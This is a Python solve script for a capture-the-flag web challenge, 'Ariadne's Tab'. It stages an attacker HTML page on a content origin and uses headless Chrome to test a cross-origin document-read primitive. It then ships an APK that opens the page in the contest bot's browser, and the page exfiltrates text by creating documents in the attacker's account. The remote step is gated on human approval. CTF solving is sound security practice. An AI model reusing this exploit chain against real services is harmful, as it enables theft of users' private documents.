#!/usr/bin/env python3
"""
Ariadne's Tab. The full six-hop chain, one input short: it wants the flag
document's UUID, which we never got.
Three run modes, nothing hardcoded, tokens minted per run. Remote path needs
CTF_ARM=1.
"""

import json
import os
import re
import secrets
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import ari
import docs

CHROME = os.path.expanduser("~/ctf-tools/chrome/chrome")
APP = "https://ariadnetab.xyz"
CONTENT = "https://content.ariadnetab.xyz"
FLAG_RE = re.compile(r"TFCCTF\{[^}]*\}")


# --------------------------------------------------------------------------- helpers
def build_page(cfg):
    """Inline the run configuration into the attacker page."""
    template = open(os.path.join(HERE, "frameread.html")).read()
    marker = re.search(r"/\*@@CFG@@\*/\s*\{.*?\};", template, re.S)
    if not marker:
        raise SystemExit("CFG marker missing from frameread.html")
    return template[: marker.start()] + "/*@@CFG@@*/ " + json.dumps(cfg) + ";" + template[marker.end():]


def fresh_token(state):
    token = ari.get_token(state["email"], state["password"])["access_token"]
    state["access_token"] = token
    ari.save_state(state)
    return token


def stage_payload(state, targets, tag, lanes=6, deadline=30000):
    """Upload the attacker page and return its content-origin viewer URL."""
    cfg = {
        "tag": tag,
        "token": state["access_token"],
        "targets": targets,
        "app": APP,
        "content": CONTENT,
        "lanes": lanes,
        "deadline": deadline,
    }
    page, _ = docs.upload(state, f"solve-{tag}.html", "text/html", build_page(cfg).encode())
    return docs.viewer_url(state, page["id"])


def candidates():
    override = os.environ.get("CTF_TARGET", "").strip()
    if override:
        return [value.strip() for value in override.replace(",", " ").split() if value.strip()]
    path = os.path.join(HERE, "candidates.txt")
    if os.path.exists(path):
        return [line.strip() for line in open(path) if line.strip() and not line.startswith("#")]
    return []


# --------------------------------------------------------------------------- local
def run_local():
    """Prove the primitive against our own account, with a negative control."""
    state = ari.load_state()
    print("[*] minting an access token")
    fresh_token(state)
    keys = docs.ensure_keys(state)

    marker = "SELFTEST-" + secrets.token_hex(6)
    target, _ = docs.upload(state, "solve-selftest.txt", "text/plain", marker.encode())
    control = "00000000-0000-4000-8000-" + secrets.token_hex(6)
    tag = "st" + secrets.token_hex(2)
    print(f"[*] target {target['id']}  control {control}")

    viewer = stage_payload(state, [target["id"], control], tag, lanes=2)

    from playwright.sync_api import sync_playwright

    with sync_playwright() as pw:
        browser = pw.chromium.launch(executable_path=CHROME, headless=True,
                                     args=["--no-sandbox", "--disable-dev-shm-usage"])
        page = browser.new_context().new_page()

        # Stand in for the bot's phone: a device keypair already in localStorage
        # on the app origin, and a live Auth0 session in the same profile.
        page.goto(APP + "/", wait_until="domcontentloaded")
        page.evaluate(
            "([priv, pub]) => { localStorage.setItem('rsaPrivateKeyPkcs8', priv);"
            " localStorage.setItem('rsaPublicKeySpki', pub); }",
            [keys["privateKey"], keys["publicKey"]])
        page.goto(APP + "/", wait_until="domcontentloaded")
        page.wait_for_selector("#login:not([hidden])", timeout=40000)
        print("[+] start() survived the 8 s channel timeout with a stored keypair")
        page.click("#login")
        page.wait_for_url(re.compile(r"auth0\.com"), timeout=30000)
        page.wait_for_selector("input#username", timeout=30000)
        page.fill("input#username", state["email"])
        if not page.query_selector("input#password"):
            page.press("input#username", "Enter")
            page.wait_for_selector("input#password", timeout=30000)
        page.fill("input#password", state["password"])
        page.press("input#password", "Enter")
        page.wait_for_url(re.compile(r"^https://ariadnetab\.xyz/"), timeout=60000)
        page.wait_for_timeout(4000)

        print("[*] loading the attacker page on the content origin")
        page.goto(viewer, wait_until="domcontentloaded")
        log = ""
        deadline = time.time() + 120
        while time.time() < deadline:
            page.wait_for_timeout(1000)
            try:
                log = page.inner_text("#log")
            except Exception:
                pass
            if "done hits=" in log:
                break
        browser.close()

    print(log)
    hit = marker in log
    missed_control = f"miss {control}" in log
    print(f"[{'+' if hit else '-'}] plaintext recovered   : {hit}")
    print(f"[{'+' if missed_control else '-'}] control correctly missed: {missed_control}")
    return log if (hit and missed_control) else None


# --------------------------------------------------------------------------- remote
def run_remote():
    """Ship the APK that opens a Custom Tab on the payload in the bot's Chrome."""
    targets = candidates()
    if not targets:
        raise SystemExit(
            "No candidate document ids.  The flag document's id is the one input this chain\n"
            "still lacks: documents/list is owner-scoped to the bot and its bearer never leaves\n"
            "the app origin.  Put candidates in solve/candidates.txt or set CTF_TARGET.")
    if os.environ.get("CTF_ARM") != "1":
        raise SystemExit(
            f"Would ship an APK to https://android.koth.pro/ probing {len(targets)} document ids.\n"
            "That is a remote action against contest infrastructure.  Re-run with CTF_ARM=1 once a\n"
            "human has approved it.")

    import subprocess

    import androidkoth
    import shot  # provision retry loop and the platform log reader

    state = ari.load_state()
    fresh_token(state)
    tag = "sv" + secrets.token_hex(2)
    viewer = stage_payload(state, targets, tag, lanes=6, deadline=25000)
    print(f"[*] payload staged, tag {tag}, probing {len(targets)} ids")

    # The APK's only job is to open a Custom Tab on that URL inside the phone's
    # Chrome profile.  The capability in the URL dies 60 minutes after issue, so
    # it is generated per run and never checked in.
    with open(shot.PAYLOAD_JAVA, "w") as handle:
        handle.write(
            "package xyz.ariadnetab.solver;\n\n"
            "public final class Payload {\n"
            "    public static final String URL = %s;\n"
            "    private Payload() {}\n}\n" % shot.java_string(viewer))
    subprocess.run([os.path.join(HERE, "build.sh"), os.path.join(HERE, "recon")],
                   check=True, cwd=HERE)

    session = shot.provision_with_retry()
    print(f"[*] session {session}")
    seen, deadline = set(), time.time() + 420
    while time.time() < deadline:
        _, payload = androidkoth.call(f"/session/{session}/logs")
        for line in (payload.get("logs", []) if isinstance(payload, dict) else []):
            if line not in seen:
                seen.add(line)
                print("   ", line, flush=True)
        if any("Runtime limit reached" in line or "Run failed" in line for line in seen):
            break
        time.sleep(4)

    # The page exfiltrates by creating documents in our own account, named
    # "<tag>|<seq>|<text>", so telemetry survives the tab being torn down.
    _, listing, _ = ari.api("documents/list", state["access_token"], {})
    rows = sorted((item["name"] for item in listing if item["name"].startswith(tag + "|")),
                  key=lambda name: int(name.split("|")[1]))
    return "\n".join(rows)


def main():
    if os.environ.get("CTF_LOCAL") == "1":
        output = run_local()
    else:
        output = run_remote()
    if not output:
        print("[-] no output recovered")
        return 1
    found = FLAG_RE.search(output)
    if found:
        print(f"FLAG {found.group(0)}")
        return 0
    print("[*] chain ran, no flag string in the output")
    return 1


if __name__ == "__main__":
    sys.exit(main())
